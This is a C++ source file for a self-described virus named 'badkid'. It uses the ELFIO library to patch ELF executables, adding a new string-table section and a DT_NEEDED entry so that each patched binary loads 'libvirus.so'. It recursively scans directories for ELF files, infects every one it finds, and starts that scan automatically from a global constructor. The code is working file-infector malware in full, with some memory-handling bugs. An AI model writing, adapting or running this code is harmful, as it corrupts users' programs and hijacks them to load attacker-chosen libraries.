#include <elfio/elfio.hpp>
#include <cstdio>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <cctype>
#include <sys/wait.h>
#include <thread>

void Infect(const char *elfName)
{
    using namespace ELFIO;
    elfio elfFile;
    elfFile.load(elfName);
    Elf_Half sec_num = elfFile.sections.size();

    section *pDynstr;
    for (int i = 0; i < sec_num; ++i) {
        section *pSec = elfFile.sections[i];
        if (pSec->get_type() == SHT_STRTAB) {
            if (pSec->get_name() == ".dynstr") {
                pDynstr = pSec;
            } else if (pSec->get_name() == ".so-sad") {
                return ;
            }
        }
    }

    section *pNewDynStr = elfFile.sections.add(".so-sad");
    pNewDynStr->set_type( pDynstr->get_type() );
    pNewDynStr->set_flags( pDynstr->get_flags() );
    pNewDynStr->set_addr_align( pDynstr->get_addr_align() );
    pNewDynStr->set_data( pDynstr->get_data(), pDynstr->get_size() );
    pNewDynStr->set_link( pDynstr->get_link() );
    string_section_accessor dynstr_acc(pNewDynStr);
    static char newLibName[] = "libvirus.so";
    size_t newStrOffset = dynstr_acc.add_string(newLibName);

    elfFile.segments[2]->add_section_index( pNewDynStr->get_index(), pNewDynStr->get_addr_align() );
    elfFile.save(elfName + std::string(".infected"));

    section *pDynSec = NULL;
    for (int i = 0; i < sec_num; ++i) {
        section *pSec = elfFile.sections[i];
        if (pSec->get_name() == ".dynamic") {
            pDynSec = pSec;
            break;
        }
    }

    Elf64_Dyn *dynData = (Elf64_Dyn *)malloc(pDynSec->get_size());
    memcpy(dynData, pDynSec->get_data(), pDynSec->get_size());
    int entNum = pDynSec->get_size() / sizeof(Elf64_Dyn);
    for (int i = 0; i < entNum; ++i) {
        if (dynData[i].d_tag == DT_STRTAB) {
            dynData[i].d_un.d_ptr = pNewDynStr->get_address();
            break;
        }
    }
    for (int i = 0; i < entNum; ++i) {
        if (dynData[i].d_tag == DT_NULL) {
            dynData[i].d_tag = DT_NEEDED;
            dynData[i].d_un.d_val = newStrOffset;
            break;
        }
    }
    pDynSec->set_link(pNewDynStr->get_index());
    pDynSec->set_data((char *)dynData, pDynSec->get_size());
    free(dynData);

    elfFile.save(elfName + std::string(".infected"));
}

int SearchDirAndInfect(const char *path)
{
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir(path)) != NULL) {
		// opendir success
		// path is a valid directory
		while ((ent = readdir(dir)) != NULL) {
			if (strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
				size_t pathlength = strlen(path), dlength = strlen(ent->d_name);
				if (pathlength == 1 && path[0] == '/') {
                    // Search from root
                    // To prevernt '//'
					pathlength = 0;
				}
                char *newname = (char *)malloc(pathlength + dlength + 2);
				strcpy(newname, path);
				newname[pathlength] = '/';
				strcpy(newname + pathlength + 1, ent->d_name);
				newname[pathlength + dlength + 2] = '\0';
				if (!SearchDirAndInfect(newname)) {
					// entry is not a directory.
					struct stat fileStatus;
					stat(newname, &fileStatus);
					if ((fileStatus.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH))) {
						// `newname` is executable file
                        char *fileContent = new char [4];
						FILE *fp = fopen(newname, "rb");
                        fread(fileContent, 1, 4, fp);
						fclose(fp);
						if (fileContent[0] == 0x7f
							&& fileContent[1] == 0x45
							&& fileContent[2] == 0x4c
							&& fileContent[3] == 0x46) {
							// TODO
                            // Call Infect Function.
                            Infect(newname);
						}
						free(fileContent);
					}
				}
				free(newname);
			}
		}
		closedir(dir);
		return 1;
	} else {
		// not a directory
		return 0;
	}
}

class Main {
private:
    int seed;
public:
    Main(int seed_) {
        this->seed = seed_;
        // Call SearchDirAndInfect
        std::cout << "You have been infected by virus `badkid`.\n\ttoo young too simple." << std::endl;
        SearchDirAndInfect(".");
        // std::thread searchThread(SearchDirAndInfect, ".");
        // searchThread.detach();
    }
};

Main obj(0x12345678);
